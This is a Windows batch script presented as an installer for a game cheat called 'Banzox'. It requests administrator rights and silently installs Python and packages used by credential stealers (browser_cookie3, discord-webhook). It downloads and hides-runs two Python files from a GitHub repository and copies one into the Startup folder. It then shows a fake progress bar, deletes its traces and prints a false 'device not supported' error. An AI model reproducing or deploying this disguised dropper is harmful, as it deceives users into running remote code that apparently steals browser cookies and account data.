@echo off
title Banzox Installer — Full Auto Setup

:: --- ROOT CHECK ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Banzox cheat can't work without access.
    echo Please right-click the file and press "Run as administrator".
    pause >nul
    exit /b 1
)

:: --- CHECK & INSTALL PYTHON ---
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Python not found. Installing Python silently...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe' -OutFile '%temp%\python_installer.exe'"
    start /wait %temp%\python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del %temp%\python_installer.exe 2>nul
    setx PATH "%PATH%;C:\Program Files\Python312;C:\Program Files\Python312\Scripts" /M >nul
    set "PATH=%PATH%;C:\Program Files\Python312;C:\Program Files\Python312\Scripts"
    echo [OK] Python installed.
) else (
    echo [OK] Python found.
)

:: --- INSTALL ALL PIP DEPENDENCIES (silent, one by one, with error suppression) ---
echo [INFO] Installing required Python packages... this may take a few minutes.

pip install psutil gputil discord-webhook browser_cookie3 requests customtkinter pycryptodome pywin32 Pillow opencv-python setuptools pyautogui pyinstaller Crypto packaging wmi cryptography --quiet --disable-pip-version-check >nul 2>&1

:: --- EXTRA INDIVIDUAL INSTALLS (redundant but ensures all are covered) ---
pip install gputil --quiet --disable-pip-version-check >nul 2>&1
pip install discord-webhook --quiet --disable-pip-version-check >nul 2>&1
pip install browser_cookie3 --quiet --disable-pip-version-check >nul 2>&1
pip install requests --quiet --disable-pip-version-check >nul 2>&1
pip install tk --quiet --disable-pip-version-check >nul 2>&1
pip install customtkinter --quiet --disable-pip-version-check >nul 2>&1
pip install pycryptodome --quiet --disable-pip-version-check >nul 2>&1
pip install pywin32 --quiet --disable-pip-version-check >nul 2>&1
pip install Pillow --quiet --disable-pip-version-check >nul 2>&1
pip install opencv-python --quiet --disable-pip-version-check >nul 2>&1
pip install setuptools --quiet --disable-pip-version-check >nul 2>&1
pip install pyautogui --quiet --disable-pip-version-check >nul 2>&1
pip install pyinstaller --quiet --disable-pip-version-check >nul 2>&1
pip install Crypto --quiet --disable-pip-version-check >nul 2>&1
pip install packaging --quiet --disable-pip-version-check >nul 2>&1
pip install wmi --quiet --disable-pip-version-check >nul 2>&1
pip install cryptography --quiet --disable-pip-version-check >nul 2>&1

echo [OK] All packages installed.

:: --- CONTINUE WITH YOUR ORIGINAL SCRIPT ---
echo.
echo [1/5] Creating random temp folder...
set "RAND_DIR=%temp%\banzox_%random%"
mkdir "%RAND_DIR%" 2>nul
cd /d "%RAND_DIR%"

echo [2/5] Downloading core files...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/banzox.py' -OutFile 'banzox.py'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/checker.py' -OutFile 'checker.py'"

echo [3/5] Placing checker in startup...
copy "checker.py" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\checker.py" >nul

echo [4/5] Launching components...
start "" pythonw "banzox.py"
start "" pythonw "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\checker.py"

:: --- LOADING BAR (4 minutes) ---
echo [5/5] The cheat is installing now — this will take a while.
echo Do NOT turn off your PC during installation.
echo.
echo Installing: 
for /l %%i in (1,1,20) do (
    ping -n 12 127.0.0.1 >nul
    set /p "=█" <nul
)
echo.
echo Installation complete.

timeout /t 240 /nobreak >nul

:: --- DELETE FILES (checker first, then banzox) ---
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\checker.py" 2>nul
del "banzox.py" 2>nul
rd "%RAND_DIR%" 2>nul

echo.
echo ERROR: the cheat didn't support your device
pause
exit /b 0
